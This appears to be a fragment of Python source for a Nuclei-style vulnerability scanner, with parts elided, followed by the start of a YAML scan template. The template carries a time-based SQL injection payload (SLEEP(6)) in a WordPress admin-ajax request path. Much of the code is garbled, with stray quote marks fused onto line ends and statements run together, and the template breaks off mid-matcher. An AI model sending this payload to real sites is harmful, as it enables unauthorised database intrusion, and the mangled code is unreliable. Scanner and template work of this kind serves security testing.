...
class NucleiTemplateEngine:
    ...
    def load_template_from_yaml(self, yaml_content: str) -> Optional[NucleiTemplate]:
        ...
        """try:
            ...
            # Parse info section
            info_data = data.get('info', {})'            info = TemplateInfo(
                name=info_data.get('name', ''),'                author=info_data.get('author', ''),'                severity=info_data.get('severity', 'info'),'                description=info_data.get('description', ''),'                reference=info_data.get('reference', []),'                tags=info_data.get('tags', [])'            )

            # Parse HTTP section
            http_data = data.get('http')'            http = None
            if http_data:
                requests = []
                for req_data in http_data.get('requests', []):'                    request = TemplateRequest(
                        method=req_data.get('method', 'GET'),'                        path=req_data.get('path', '/'),'                        headers=req_data.get('headers', {}),'                        body=req_data.get('body')'                    )
                    requests.append(request)

                matchers = []
                for matcher_data in http_data.get('matchers', []):'                    matcher = MatcherCondition(
                        type=matcher_data.get('type', 'word'),'                        dsl=matcher_data.get('dsl'),'                        status_code=matcher_data.get('status_code'),'                        headers=matcher_data.get('headers'),'                        body=matcher_data.get('body'),'                        words=matcher_data.get('words'),'                        regex=matcher_data.get('regex')'                    )
            ...
            for request in template.http.requests:
                ...
                if matched:
                    return ScanResult(
                        ...
                        info=template.info,
                        request_details={
                            'method': request.method,'                            'url': url,'                            'headers': request.headers,'                            'body': request.body'                        },
                        response_details={
                            'status_code': response.status_code,'                            'headers': dict(response.headers),'                            'content': response.text[:1000]  # Truncate for storage'                        }
                    )
    ...
    async def _make_http_request(
        ...
        """Make HTTP request with timeout."""try:
            ...
            self.logger.error(f"HTTP request failed: {e}")"            return None
    ...
    def _check_matchers(self, matchers: List[MatcherCondition],
        ...
        if condition.lower() == "and":"            return all(results)
    ...
    def _check_single_matcher(self, matcher: MatcherCondition, response: requests.Response) -> bool:
        """Check a single matcher condition."""try:
            ...
            elif matcher.type == "regex":"                return self._check_regex_matcher(matcher.regex or [], response.text)
            else:
                self.logger.warning(f"Unknown matcher type: {matcher.type}")"                return False
        except Exception as e:
            ...
            if "status_code" in expr and "==" in expr:"                # Simple status code check
                parts = expr.split("==")"                if len(parts) == 2:
                    ...
                    if response.status_code != expected_code:
                        return False
            elif "duration" in expr and ">=" in expr:"                # Duration check (simplified - would need timing)
                pass
            elif "contains" in expr:"                # Content check
                if "body" in expr and not any(word in response.text for word in ["error", "not found"]):"                    return False
...
http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1)and (SELECT 6416 FROM (SELECT(S\"LEEP(6)))nEiK)-- vqlq""
    matchers:
      - type: dsl
        dsl:
